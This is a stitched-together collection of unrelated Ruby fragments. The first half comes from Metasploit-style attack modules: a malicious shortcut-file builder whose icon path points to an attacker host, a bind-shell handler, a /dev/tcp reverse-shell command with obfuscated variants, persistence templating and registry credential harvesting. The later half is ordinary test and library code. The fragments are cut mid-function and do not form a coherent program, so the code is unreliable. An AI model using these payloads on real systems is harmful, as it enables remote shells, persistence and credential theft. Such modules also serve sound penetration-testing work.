
        
          def createlnk
    #Code below taken from module droplnk.rb written by Mubix
    lnk = ''
    lnk << '\x4c\x00\x00\x00'                  #Header size
    lnk << '\x01\x14\x02\x00\x00\x00\x00\x00'  #Link CLSID
    lnk << '\xc0\x00\x00\x00\x00\x00\x00\x46'
    lnk << '\xdb\x00\x00\x00'                  #Link flags
    lnk << '\x20\x00\x00\x00'                  #File attributes
    lnk << '\x30\xcd\x9a\x97\x40\xae\xcc\x01'  #Creation time
    lnk << '\x30\xcd\x9a\x97\x40\xae\xcc\x01'  #Access time
    lnk << '\x30\xcd\x9a\x97\x40\xae\xcc\x01'  #Write time
    lnk << '\x00\x00\x00\x00'                  #File size
    lnk << '\x00\x00\x00\x00'                  #Icon index
    lnk << '\x01\x00\x00\x00'                  #Show command
    lnk << '\x00\x00'                          #Hotkey
    lnk << '\x00\x00'                          #Reserved
    lnk << '\x00\x00\x00\x00'                  #Reserved
    lnk << '\x00\x00\x00\x00'                  #Reserved
    lnk << '\x7b\x00'                          #IDListSize
    #sIDList
    lnk << '\x14\x00\x1f\x50\xe0\x4f\xd0\x20'
    lnk << '\xea\x3a\x69\x10\xa2\xd8\x08\x00'
    lnk << '\x2b\x30\x30\x9d\x19\x00\x2f'
    lnk << 'C:\\'
    lnk << '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    lnk << '\x00\x00\x00\x4c\x00\x32\x00\x00\x00\x00\x00\x7d\x3f\x5b\x15\x20'
    lnk << '\x00'
    lnk << 'AUTOEXEC.BAT'
    lnk << '\x00\x00\x30\x00\x03\x00\x04\x00\xef\xbe\x7d\x3f\x5b\x15\x7d\x3f'
    lnk << '\x5b\x15\x14\x00\x00\x00'
    lnk << Rex::Text.to_unicode('AUTOEXEC.BAT')
    lnk << '\x00\x00\x1c\x00\x00\x00'
    #sLinkInfo
    lnk << '\x3e\x00\x00\x00\x1c\x00\x00\x00\x01\x00'
    lnk << '\x00\x00\x1c\x00\x00\x00\x2d\x00\x00\x00\x00\x00\x00\x00\x3d\x00'
    lnk << '\x00\x00\x11\x00\x00\x00\x03\x00\x00\x00\x3e\x77\xbf\xbc\x10\x00'
    lnk << '\x00\x00\x00'
    lnk << 'C:\\AUTOEXEC.BAT'
    lnk << '\x00\x00\x0e\x00'
    #RELATIVE_PATH
    lnk << Rex::Text.to_unicode('.\\AUTOEXEC.BAT')
    lnk << '\x03\x00'
    #WORKING_DIR
    lnk << Rex::Text.to_unicode('C:\\')
    #ICON LOCATION
    lnk << '\x1c\x00'
    lnk << Rex::Text.to_unicode('\\\\#{datastore['LHOST']}\\icon.ico')
    lnk << '\x00\x00\x03\x00\x00\xa0\x58\x00\x00\x00\x00\x00\x00\x00'
    lnk << 'computer'
    lnk << '\x00\x00\x00\x00\x00\x00\x26\x4e\x06\x19\xf2\xa9\x31\x40\x91\xf0'
    lnk << '\xab\x9f\xb6\xb1\x6c\x84\x22\x03\x57\x01\x5e\x1d\xe1\x11\xb9\x48'
    lnk << '\x08\x00\x27\x6f\xe3\x1f\x26\x4e\x06\x19\xf2\xa9\x31\x40\x91\xf0'
    lnk << '\xab\x9f\xb6\xb1\x6c\x84\x22\x03\x57\x01\x5e\x1d\xe1\x11\xb9\x48'
    lnk << '\x08\x00\x27\x6f\xe3\x1f\x00\x00\x00\x00'
    
          while (stime + ctimeout > Time.now.to_i)
        begin
          client = Rex::Socket::Tcp.create(
            'PeerHost' => rhost,
            'PeerPort' => lport.to_i,
            'Proxies'  => datastore['Proxies'],
            'Context'  =>
              {
                'Msf'        => framework,
                'MsfPayload' => self,
                'MsfExploit' => assoc_exploit
              })
        rescue Rex::ConnectionError => e
          vprint_error(e.message)
        rescue
          wlog('Exception caught in bind handler: #{$!.class} #{$!}')
        end
    
          # Valid client connection?
      if (client)
        # Increment the has connection counter
        self.pending_connections += 1
    
      #
  # Returns the command string to use for execution
  #
  def command_string
    fd = rand(200) + 20
    return '0<&#{fd}-;exec #{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']};sh <&#{fd} >&#{fd} 2>&#{fd}';
    # same thing, no semicolons
    #return '/bin/bash #{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']} <&#{fd} >&#{fd}'
    # same thing, no spaces
    #return 's=${IFS:0:1};eval$s\'bash${s}#{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']}$s<&#{fd}$s>&#{fd}&\''
  end
end

    
    end
    
        fields = {}
    i = 0
    doc.elements.each('plist/dict/array') do |element|
      data = []
      fields[keys[i]] = data
      element.each_element('*') do |thing|
        data_set = thing.text
        if data_set
          data << data_set.gsub('\n\t\t','')
        else
          data << data_set
        end
      end
      i+=1
    end
    return fields
  end
    
      def metsvc_template(buf)
    @install_cmd = Rex::Text.rand_text_alpha(4..8)
    @start_cmd   = Rex::Text.rand_text_alpha(4..8)
    template = File.read(File.join(Msf::Config.data_directory, 'exploits', 'persistence_service', 'service.erb'))
    ERB.new(template).result(binding)
  end
end

    
        if http_proxy_password == nil
      return
    else
      # A proxy with password is utilized, gather details
      print_good('HTTP Proxy Settings')
      http_proxy_username= registry_getvaldata('#{@key_base}', 'http-proxy-username')
      http_proxy_host = registry_getvaldata('#{@key_base}', 'http-proxy-host')
      http_proxy_port = registry_getvaldata('#{@key_base}', 'http-proxy-port')
    
      # Function for creating log folder and returning log path
  #-------------------------------------------------------------------------------
  def log_file(log_path = nil)
    # Get hostname
    host = session.sys.config.sysinfo['Computer']
    
        # Execute the powershell script
    print_status 'Building remote code.'
    cmd_out, running_pids, open_channels = execute_script(script, true)
    get_ps_output(cmd_out, eof)
    vprint_good 'Cleaning up #{running_pids.join(', ')}'
    
      # Use default logging formatter so that PID and timestamp are not suppressed.
  config.log_formatter = ::Logger::Formatter.new
end

    
      describe '#identifier' do
    let(:source) do
      'class Foo; end'
    end
    
        context 'with an empty body' do
      let(:source) do
        'module Foo; end'
      end
    
      context 'when passing method as symbol' do
    it 'does not register an offense' do
      expect_no_offenses(<<~RUBY)
        class SomeClass
          def some_method
            puts 10
          end
          private :some_method
        end
      RUBY
    end
  end
    
              it 'registers an offense' do
            inspect_source(source)
            expect(cop.offenses.size).to eq(1)
            expect(cop.messages).to eq(['Use `Integer` instead of `#{klass}`.'])
          end
    
          # Checks whether this node body is a void context.
      # Always `true` for `for`.
      #
      # @return [true] whether the `for` node body is a void context
      def void_context?
        true
      end
    
      test 'displays_latest_changes' do
    get('/latest_changes')
    body = last_response.body
    
      teardown do
    FileUtils.rm_r(File.join(File.dirname(__FILE__), *%w[examples test.git]))
  end
    
        # Remove all slashes from the start of string.
    # Remove all double slashes
    def clean_url url
      return url if url.nil?
      url.gsub('%2F', '/').gsub(/^\/+/, '').gsub('//', '/')
    end
    
      describe '#tmux' do
    it { expect(instance.tmux).to eq 'wemux' }
  end
end

    
        def tmux_main_command(command)
      if command
        _send_target(command.shellescape)
      else
        ''
      end
    end
    
    desc 'Start an IRB session with all necessary files required.'
task :shell do |t|
  chdir File.dirname(__FILE__)
  exec 'irb -I lib/ -I lib/paperclip -r rubygems -r active_record -r tempfile -r init'
end
    
    When /^(?:|I )select '([^']*)' from '([^']*)'$/ do |value, field|
  select(value, :from => field)
end
    
      def migration_version
    if Rails.version.start_with? '5'
      '[#{Rails::VERSION::MAJOR}.#{Rails::VERSION::MINOR}]'
    end
  end
end

    
        def definitions_for(klass)
      parent_classes = klass.ancestors.reverse
      parent_classes.each_with_object({}) do |ancestor, inherited_definitions|
        inherited_definitions.deep_merge! @attachments[ancestor]
      end
    end
  end
end
